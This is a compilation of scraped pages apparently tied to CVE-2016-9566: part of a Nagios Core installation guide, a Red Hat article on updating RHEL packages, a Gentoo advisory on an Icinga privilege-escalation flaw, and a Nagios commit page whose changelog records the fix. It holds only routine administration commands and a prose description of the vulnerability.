Service / Daemon This command starts Nagios Core.  ``` sudo /etc/rc.d/init.d/nagios start  ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. These steps are going to install the Nagios Plugins that are available via MacPorts. Future versions of the Nagios Plugins package will be updated to support OS X, until then the version available via MacPorts will be fine.  These get installed to /opt/local/libexec/nagios/ so the /usr/local/nagios/etc/**resource.cfg** file also needs to be updated and Nagios restarted (covered in the steps below).  ``` sudo /opt/local/bin/port install nagios-pluginssudo sed -i '' 's/\/usr\/local\/nagios\/libexec/\/opt\/local\/libexec\/nagios/g' /usr/local/nagios/etc/resource.cfgsudo /etc/rc.d/init.d/nagios stopsudo /etc/rc.d/init.d/nagios start  ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands These commands are for starting / stopping / restarting / status Nagios.  ``` sudo /etc/rc.d/init.d/nagios startsudo /etc/rc.d/init.d/nagios stopsudo /etc/rc.d/init.d/nagios restartsudo /etc/rc.d/init.d/nagios status  ```         Final Thoughts For any support related questions please visit the [Nagios Support Forums](http://support.nagios.com/forum/) at:  http://support.nagios.com/forum/      **Special Offer For Knowledgebase Visitors!** Get a huge discount on [Nagios Log Server](https://www.nagios.com/lspromo/?ref=SDEMORET&utm_campaign=lspromo&utm_source=kb&utm_medium=text&utm_term=text-bottom) by clicking below. [Get 60% Off Nagios Log Server!](https://www.nagios.com/lspromo/?ref=SDEMORET&utm_campaign=lspromo&utm_source=kb&utm_medium=banner&utm_term=banner-bottom)   **Did you know?** Nagios provides complete monitoring of: [Windows](https://www.nagios.com/solutions/windows-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [Linux](https://www.nagios.com/solutions/linux-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [UNIX](https://www.nagios.com/solutions/unix-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [Servers](https://www.nagios.com/solutions/server-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [Websites](https://www.nagios.com/solutions/website-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [SNMP](https://www.nagios.com/solutions/snmp-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [DHCP](https://www.nagios.com/solutions/dhcp-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [DNS](https://www.nagios.com/solutions/dns-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [Email](https://www.nagios.com/solutions/email-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [Storage](https://www.nagios.com/solutions/storage-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [Files](https://www.nagios.com/solutions/file-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [Apache](https://www.nagios.com/solutions/apache-log-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [IIS](https://www.nagios.com/solutions/iis-log-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), [EC2](https://www.nagios.com/solutions/amazon-ec2-monitoring/?utm_campaign=solutions&utm_source=kb&utm_medium=footer), and [more](https://www.nagios.com/solutions/?utm_campaign=solutions&utm_source=kb&utm_medium=footer)! | | Posted by: **jolson** on Wed, May 20, 2015 at 2:07 PM. This article has been viewed 747888 times. | | [Have a question? Try our Forums!](https://support.nagios.com "Try the Nagios support forums!") | [Give Feedback](https://nagios.wufoo.com/forms/support-knowledgebase-feedback/def/field9%3D96 "let us know how we are doing!") | | | 4.23 (62)  Article Rating (62 Votes)  Rate this article | * [Icon Subscriber](https://support.nagios.com/kb/subscribe-96.html) * [Icon Printer](https://support.nagios.com/kb/print-96.html) * Icon Email | * [Icon PDF](https://support.nagios.com/kb/pdf-96.html) * [Icon MS-Word](https://support.nagios.com/kb/doc-96.html) | | --- | --- | --- | | | Attachments Attachments There are no attachments for this article. | | Related Articles [RSS Feed](https://support.nagios.com/kb/rss-related-96.html "RSS") [Nagios Core - Quickstart Installation Guides](https://support.nagios.com/kb/article/nagios-core-quickstart-installation-guides-345.html) Viewed 25770 times since Sun, Jan 31, 2016  [Nagios XI - What Platforms Does Nagios XI Run On](https://support.nagios.com/kb/article/nagios-xi-what-platforms-does-nagios-xi-run-on-687.html) Viewed 8665 times since Wed, Jul 19, 2017  [Nagios Core - Installing Nagios Core on Ubuntu](https://support.nagios.com/kb/article/nagios-core-installing-nagios-core-on-ubuntu-97.html) Viewed 53133 times since Wed, May 20, 2015 | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | | | | **Subscribe to knowledge base** Get notified when new articles are added to the knowledge base. | | --- | |  | | Nagios | | --- | --- | --- | --- | | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |



=== Content from access.redhat.com_c262b403_20250126_033722.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)

  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Product Documentation](https://access.redhat.com/documentation)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)

  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform)
  [All Product Docs](//docs.redhat.com/en/products/)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)

  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Classifications](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Severety Ratings](https://access.redhat.com/security/security-updates/#/cve)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)

  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

 Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

# How do I apply package updates to my RHEL system?

Updated 2023-06-08T17:44:17+00:00 -
English

* [English](https://access.redhat.com/articles/11258)
* [Japanese](https://access.redhat.com/ja/articles/17461)
* [Chinese](https://access.redhat.com/zh-hans/articles/7047073)

## Table of Contents

* [Environment considerations](#environment-considerations-1)
* [Prerequisites](#prerequisites-2)
* [Registering the system with the Subscription Manager](#rhsm)
* [Graphical interface](#graphical-interface-4)
* [Command line](#command-line-5)

* [Applying package updates on Red Hat Enterprise Linux 9](#rhel9)
* [Applying package updates on Red Hat Enterprise Linux 8](#rhel8)
* [Applying package updates on Red Hat Enterprise Linux 7](#rhel7)
* [Applying package updates on Red Hat Enterprise Linux 6](#rhel6)
* [Applying package updates on Red Hat Enterprise Linux 5](#rhel5)

## Environment considerations

Red Hat Enterprise Linux starting with versions 6.1 and 5.7 introduced a new Red Hat Subscription Management (RHSM) service. Red Hat Network (RHN) has been decommissioned.

Users that are new to Red Hat or would like the enhanced subscription information and improved content access should use RHSM. If you are still using Red Hat Network, we advise you to [migrate to RHSM as soon as possible](https://access.redhat.com/products/red-hat-subscription-management#migration). Customers using older versions of Red Hat Enterprise Linux must continue using RHN Classic. Refer to [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](https://access.redhat.com/articles/47844) and [What's the difference between management services provided by Red Hat Network (RHN) Classic and Red Hat Subscription Management (RHSM)?](https://access.redhat.com/articles/63269) for more information on benefits of RHSM over RHN.

* For **Red Hat Enterprise Linux 9**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 9](#rhel9).
* For **Red Hat Enterprise Linux 8**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 8](#rhel8).
* For **Red Hat Enterprise Linux 7**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 7](#rhel7).
* For **Red Hat Enterprise Linux 6**, register the system using RHSM (if RHEL 6.1 or above) as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 6](#rhel6).
* For **Red Hat Enterprise Linux 5**, register the system using RHSM (if RHEL 5.7 or above) as described in [Registering the system with the Subscription Manager](#rhsm). After registration, update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 5](#rhel5).
* If your system cannot connect to the Internet directly, our [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/) offering may be of interest.

## Prerequisites

### Registering the system with the Subscription Manager

#### Graphical interface

Access the Subscription Management GUI client in Red Hat Enterprise Linux 9 via **Activities** and then **Show Applications** which is visible in the Favorites dock by default.

Access the Subscription Management GUI client in Red Hat Enterprise Linux 8 via **Activities**, then select **Show Applications** and click **All**. Then select **Red Hat Subscription Manager**.

In Red Hat Enterprise Linux 7 open **Applications** -> **System Tools** -> **Red Hat Subscription Manager** and in Red Hat Enterprise Linux 6 via **System** -> **Administration** -> **Red Hat Subscription Manager**.

#### Command line

A system can also be registered via the command line by using the "subscription-manager" command. To register your system, either through the GUI or from the command line, follow the instructions in the [Using and Configuring Red Hat Subscription Manager](https://access.redhat.com/documentation/en-US/Red_Hat_Subscription_Management/1/html-single/RHSM/index.html) guide.

Make sure that your firewall allows configuring RHSM, for more information see [How do I access RHSM (yum) through a firewall?](https://access.redhat.com/solutions/65300).

General information on RHSM can be found in [Red Hat Network Subscription Management](https://access.redhat.com/documentation/en-US/Red_Hat_Customer_Portal/1/html/Red_Hat_Network_Certificate-based_Subscription_Management/index.html), while [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](/knowledge/node/47844) provides a quick overview and a comparison with RHN.

## Applying package updates on Red Hat Enterprise Linux 9

Before installing an update, make sure all previously released errata relevant to the system have been applied.

To access updates when using Red Hat Enterprise Linux 9, launch the graphical update tool through **Applications** and then **Software** which is visible in the Favorites dock (by default).

```
# gnome-software

```

Within the graphical interface, select **Updates**.

For a command line interface, use the following command to update the operating system:

```
# dnf upgrade

```

To install a specific package, such as vsftpd, use the following command:

```
# dnf install vsftpd

```

To update a specific package, such as bind, use the following command:

```
# dnf upgrade bind

```

To find more information about the command line options available for `yum`, use the following command:

```
# man dnf

```
## Applying package updates on Red Hat Enterprise Linux 8

Before installing an update, make sure all previously released errata relevant to the system have been applied.

To access updates when using Red Hat Enterprise Linux 8, launch the graphical update tool through **Applications** -> **Show Applications** -> **All** -> **Software**, or from the command line via the following command:

```
# gnome-software

```

Within the graphical interface, select **Updates**.

For a command line interface, use the following command to update the operating system:

```
# dnf update

```

To install a specific package, such as vsftpd, use the following command:

```
# dnf install vsftpd

```

To update a specific package, such as bind, use the following command:

```
# dnf update bind

```

To find more information about the command line options available for `yum`, use the following command:

```
# man dnf

```
## Applying package updates on Red Hat Enterprise Linux 7

Before installing an update, make sure all previously released errata relevant to the system have been applied.

To access updates when using Red Hat Enterprise Linux 7, launch the graphical update tool through **Applications** -> **System Tools** -> **Software Update**, or from the command line via the following command:

```
# gpk-update-viewer

```

For a command line interface, use the following command to update the operating system:

```
# yum update

```

To install a specific package, such as vsftpd, use the following command:

```
# yum install vsftpd

```

To update a specific package, such as bind, use the following command:

```
# yum update bind

```

To find more information about the command line options available for `yum`, use the following command:

```
# man yum

```
## Applying package updates on Red Hat Enterprise Linux 6

Before installing an update, make sure all previously released errata relevant to the system have been applied.

To access updates when using Red Hat Enterprise Linux 6, launch the graphical update tool through **System** -> **Administration** -> **Software Update**, or from the command line via the following command:

```
# gpk-update-viewer

```

For a command line interface, use the following command to update the operating system:

```
# yum update

```

To install a specific package, such as vsftpd, use the following command:

```
# yum install vsftpd

```

To update a specific package, such as bind, use the following command:

```
# yum update bind

```

To find more information about the command line options available for `yum`, use the following command:

```
# man yum

```
## Applying package updates on Red Hat Enterprise Linux 5

Before installing an update, make sure all previously released errata relevant to the system have been applied.

To access updates when using Red Hat Enterprise Linux 5, launch the graphical update tool through **Applications** -> **System Tools** -> **Software Updater**, or from the command line via the following command:

```
# pup

```

For a command line interface, use the following command to update the operating system:

```
# yum update

```

To install a specific package, such as vsftpd, use the following command:

```
# yum install vsftpd

```

To update a specific package, such as bind, use the following command:

```
# yum update bind

```

To find more information about the command line options available for `yum`, use the following command:

```
# man yum

```

* **Product(s)**
* [Red Hat Network](https://access.redhat.com/search?q=Red+Hat+Network&documentKind=Article%26Solution)
* [Red Hat Subscription Management](https://access.redhat.com/search?q=Red+Hat+Subscription+Management&documentKind=Article%26Solution)

* **Category**
* [Learn more](https://access.redhat.com/search?q=Learn+more&documentKind=Article%26Solution)

* **Component**
* [rhn\_register](https://access.redhat.com/search?q=rhn_register&documentKind=Article%26Solution)
* [subscription-manager](https://access.redhat.com/search?q=subscription-manager&documentKind=Article%26Solution)

* **Tags**
* [customer\_portal](https://access.redhat.com/search?q=customer_portal&documentKind=Article%26Solution)

* **Article Type**
* [General](https://access.redhat.com/search?q=General&documentKind=Article%26Solution)

## Comments

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com)

### Help

* [Contact Customer Portal](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Systems Status

### About

* [Red Hat Subscription Value](https://access.redhat.com/subscription-value)
* [About Red Hat](https://www.redhat.com/about/)
* [Red Hat Jobs](http://jobs.redhat.com)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

Copyright © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)

×
### Formatting Tips

Here are the common uses of Markdown.

Code blocks
```
~~~
Code surrounded in tildes is easier to read
~~~
```

Links/URLs`[Red Hat Customer Portal](https://access.redhat.com)`

[Learn more](/help/markdown)
Close

×
#### Request a English Translation

Are you sure you want to update a translation?
It seems an existing [English Translation](%40url) exists already.
We appreciate your interest in having Red Hat content localized to your language. Please note that excessive use of this feature could cause delays in getting specific content you are interested in translated.
Close
 [Request Japanese Translation](/articles/11258?rate=4KpVk2OisoRoaBCC1xAYYu2EqqVd-hs-lWbo3UiEzrI "Request Japanese Translation") [Request Chinese Translation](/articles/11258?rate=Djff6xI-V_Ac9jkgVml5Zy46vWj-_DUy2x9AY3QVlmM "Request Chinese Translation") [Request Korean Translation](/articles/11258?rate=Jlnc4lh8Dy-a-VpnQ5nujpRwH0WyxQjy0mAR7wwUHTU "Request Korean Translation")

×
#### Generating Machine Translation

Loading…
We are generating a machine translation for this content. Depending on the length of the content, this process could take a while.

Cancel



=== Content from security.gentoo.org_bcaf15bb_20250124_212420.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Icinga: Privilege escalation — GLSA **201612-51**

A vulnerability in Icinga could lead to privilege escalation.

### Affected packages

| Package | **net-analyzer/icinga** on all architectures |
| --- | --- |
| Affected versions | < **1.13.4** |
| Unaffected versions | >= **1.13.4** |

### Background

Icinga is an open source computer system and network monitoring
application. It was originally created as a fork of the Nagios system
monitoring application in 2009.

### Description

Icinga daemon was found to perform unsafe operations when handling the
log file.

### Impact

A local attacker, who either is already Icinga’s system user or
belongs to Icinga’s group, could potentially escalate privileges.

### Workaround

There is no known workaround at this time.

### Resolution

All Icinga users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-analyzer/icinga-1.13.4"

```
### References

* [CVE-2016-9566](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-9566)

**Release date**

December 31, 2016

**Latest revision**

December 31, 2016: 1

**Severity**

normal

**Exploitable**

local

**Bugzilla entries**

* [603534](https://bugs.gentoo.org/show_bug.cgi?id=603534)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from github.com_ea809c57_20250124_212418.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNagiosEnterprises%2Fnagioscore%2Fcommit%2Fc29557dec91eba2306f5fb11b8da4474ba63f8c4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNagiosEnterprises%2Fnagioscore%2Fcommit%2Fc29557dec91eba2306f5fb11b8da4474ba63f8c4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=NagiosEnterprises%2Fnagioscore)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NagiosEnterprises](/NagiosEnterprises)
/
**[nagioscore](/NagiosEnterprises/nagioscore)**
Public

* [Notifications](/login?return_to=%2FNagiosEnterprises%2Fnagioscore) You must be signed in to change notification settings
* [Fork
  452](/login?return_to=%2FNagiosEnterprises%2Fnagioscore)
* [Star
   1.6k](/login?return_to=%2FNagiosEnterprises%2Fnagioscore)

* [Code](/NagiosEnterprises/nagioscore)
* [Issues
  186](/NagiosEnterprises/nagioscore/issues)
* [Pull requests
  4](/NagiosEnterprises/nagioscore/pulls)
* [Actions](/NagiosEnterprises/nagioscore/actions)
* [Projects
  0](/NagiosEnterprises/nagioscore/projects)
* [Security](/NagiosEnterprises/nagioscore/security)
* [Insights](/NagiosEnterprises/nagioscore/pulse)

Additional navigation options

* [Code](/NagiosEnterprises/nagioscore)
* [Issues](/NagiosEnterprises/nagioscore/issues)
* [Pull requests](/NagiosEnterprises/nagioscore/pulls)
* [Actions](/NagiosEnterprises/nagioscore/actions)
* [Projects](/NagiosEnterprises/nagioscore/projects)
* [Security](/NagiosEnterprises/nagioscore/security)
* [Insights](/NagiosEnterprises/nagioscore/pulse)

## Commit

[Permalink](/NagiosEnterprises/nagioscore/commit/c29557dec91eba2306f5fb11b8da4474ba63f8c4)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge branch 'maint'

[Browse files](/NagiosEnterprises/nagioscore/tree/c29557dec91eba2306f5fb11b8da4474ba63f8c4)
Browse the repository at this point in the history

* Loading branch information

John C. Frickson
committed
Dec 7, 2016

2 parents
[bc90881](/NagiosEnterprises/nagioscore/commit/bc908814906d413723cdf2e14a1ee750a141e8c7)
+
[8e6e1cb](/NagiosEnterprises/nagioscore/commit/8e6e1cb29f3c1b933b0e13fb937ad5ca8b448ccc)

commit c29557d

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**51 additions**
and
**6 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* Changelog
  [Changelog](#diff-ead07c84baac57a9542f388a07a2a5209456ce790b04251bc9bd7d179ea85cb1)
* THANKS
  [THANKS](#diff-cba98d84635a013da383b41ac94b727826547fff8c838136e4be7c041759d0ac)
* base

  + base/logging.c
    [logging.c](#diff-0c8c08c90ed4120a4abb201a98f452cd34f1630ca28d07c28bbd51056104ab6f)

## There are no files selected for viewing

6 changes: 6 additions & 0 deletions

6
[Changelog](#diff-ead07c84baac57a9542f388a07a2a5209456ce790b04251bc9bd7d179ea85cb1 "Changelog")

Show comments

[View file](/NagiosEnterprises/nagioscore/blob/c29557dec91eba2306f5fb11b8da4474ba63f8c4/Changelog)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,6 +2,12 @@ |
|  |  | Nagios Core 4 Change Log |
|  |  | ######################## |
|  |  |  |
|  |  | 4.2.x - xxxx-xx-xx |
|  |  | ------------------ |
|  |  | SECURITY FIXES |
|  |  | \* Fixed another root privilege escalation (CVE-2016-9566) Thanks for bringing this |
|  |  | to our attention go to Dawid Golunski (http://legalhackers.com). |
|  |  |  |
|  |  |  |
|  |  | 4.2.3 - 2016-11-21 |
|  |  | ------------------- |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[THANKS](#diff-cba98d84635a013da383b41ac94b727826547fff8c838136e4be7c041759d0ac "THANKS")

Show comments

[View file](/NagiosEnterprises/nagioscore/blob/c29557dec91eba2306f5fb11b8da4474ba63f8c4/THANKS)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
